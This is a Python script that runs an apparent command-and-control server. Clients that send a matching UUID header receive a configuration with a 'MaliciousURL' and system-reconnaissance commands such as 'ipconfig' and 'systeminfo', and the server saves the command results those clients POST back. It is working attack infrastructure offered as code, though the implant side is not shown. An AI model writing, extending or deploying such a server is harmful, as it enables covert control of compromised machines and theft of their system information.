from http.server import BaseHTTPRequestHandler, HTTPServer
import time
import urllib.request
import os
import json

hostName = "A" #ip
hostPort = 0 #443
UUID = ''
MaliciousPath = ''
Commands=[]
Configuration = "{'Server': 'localhost', 'Commands':['ipconfig','systeminfo'],'MaliciousURL': 'httpL//localhost/malicious'}"

def ConfigurationServer():
    with open('configuration.json') as f:
        confFileJson = json.load(f)
        global hostName
        global hostPort
        global UUID
        global MaliciousPath
        global Commands
        global Configuration

        hostName = confFileJson['Server']
        hostPort = confFileJson['Port']
        UUID = confFileJson['UUID']
        MaliciousPath = confFileJson['MaliciousPath']
        Commands = confFileJson['Commands']

        Configuration = {"Server": hostName, "Commands":Commands,"MaliciousURL": hostName+MaliciousPath}
        print(Commands)
        print(Configuration)

class MyServer(BaseHTTPRequestHandler):
    def do_GET(self):
        if (self.headers.get('UUID') == UUID):
            #print('UUID is good')
            if self.path.endswith("/Configuration"):
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                print((Configuration))
                #with open('configuration.json') as data_file:
                #    data = json.load(data_file)
                self.wfile.write(Configuration.encode())
                #print(Configuration)
                print('Got Configuration request')
                #print('Returned:'+json.loads(Configuration))
                #self.wfile.write(json.dumps(Configuration))

                #self.wfile.write(output.encode(encoding='utf_8'))
                #print (output)
                return
    def do_POST(self):
        if (self.headers.get('UUID') == UUID):
            if self.path.endswith("/Commands"):
                print('Got POST Command')
                self.data_string = self.rfile.read(int(self.headers['Content-Length']))

                self.send_response(200)
                self.end_headers()

                data = json.loads(self.data_string)
                print(data)
                with open("commandResults.json", "a+") as outfile:
                    json.dump(data, outfile)
                #print (data)
                #file = open("commands.txt","a+")
                self.wfile.write(("Done").encode())
                return

ConfigurationServer()
print(hostName)
myServer = HTTPServer((hostName, hostPort), MyServer)
print(time.asctime(), "Server Starts - %s:%s" % (hostName, hostPort))

try:
    myServer.serve_forever()
except KeyboardInterrupt:
    pass

myServer.server_close()
print(time.asctime(), "Server Stops - %s:%s" % (hostName, hostPort))
